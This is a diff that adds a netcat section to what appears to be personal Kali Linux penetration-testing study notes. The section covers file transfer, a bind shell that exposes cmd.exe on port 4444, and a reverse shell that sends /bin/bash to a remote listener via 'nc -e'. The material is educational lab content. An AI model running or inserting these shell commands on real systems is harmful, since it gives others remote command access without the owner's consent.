@@ -42,6 +42,11 @@
     - [alias](#alias)
     - [Persistent Bash Customization](#Persistent-Bash-Customization)
 3. [Practical Tools](#Practical-Tools)
+    3.1. [netcat](#netcat)
+    - [Transferring Files with Netcat](#Transferring-Files-with-Netcat)
+    - [Remote Administration with Netcat](#Remote-Administration-with-Netcat)
+        - [Netcat Bind Shell Scenario](#Netcat-Bind-Shell-Scenario)
+        - [Reverse Shell Scenario](#Reverse-Shell-Scenario)
 # Getting Comfortable with Kali Linux
 ## Finding Files in Kali Linux
 ### which 
@@ -293,3 +298,39 @@ if [ -x /usr/bin/dircolors ]; then
     alias ls='ls --color=auto'
 ```
 # Practical Tools
+## netcat
+### Transferring Files with Netcat
+Netcat can be used to transfer files, both text and binary. Forensics investigators often use Netcat in conjunction with **dd** (a disk copying utility) to create forensically sound disk images over a network.
+```console
+#target
+C:\Users\offsec> nc -nlvp 4444 > incoming.exe
+listening on [any] 4444 ...
+#kali
+kali@kali:~$ nc -nv 10.11.0.22 4444 < /usr/share/windows-resources/binaries/wget.exe
+(UNKNOWN) [10.11.0.22] 4444 (?) open
+```
+*Notice that we have not received any feedback from Netcat about our file upload progress.*
+### Remote Administration with Netcat
+**`-e`** option - executes a program after making or receiving a successful connection. This option can redirect the **input**, **output**, and **error messages** of an executable to a
+TCP/UDP port rather than the default console. By redirecting **stdin**, **stdout**, and **stderr** to the network, we can bind **cmd.exe** to a local port. Anyone connecting to this port will be presented with a command prompt on the target computer.
+#### Netcat Bind Shell Scenario
+```console
+#Bob with public IP - 10.11.0.22 - Netcat has bound TCP port 4444 to cmd.exe
+C:\Users\offsec> nc -nlvp 4444 -e cmd.exe
+listening on [any] 4444 ...
+#Alice - behind a NATed connection
+kali@kali:~$ nc -nv 10.11.0.22 4444
+```
+#### Reverse Shell Scenario
+*the ability to send a command shell of **netcat***
+Alice has no control over the router in her office, and therefore cannot forward traffic from the router to her internal machine. Alice cannot bind a port to **/bin/bash** locally on her computer but she can send control of her command prompt to Bob's machine instead. 
+```console
+#Bob - 10.11.0.22
+C:\Users\offsec> nc -nlvp 4444
+listening on [any] 4444 ...
+#Alice - Netcat will have redirected /bin/bash input, output, and error data streams to Bob's machine
+kali@kali:~$ nc -nv 10.11.0.22 4444 -e /bin/bash
+(UNKNOWN) [10.11.0.22] 4444 (?) open
+```
+
+
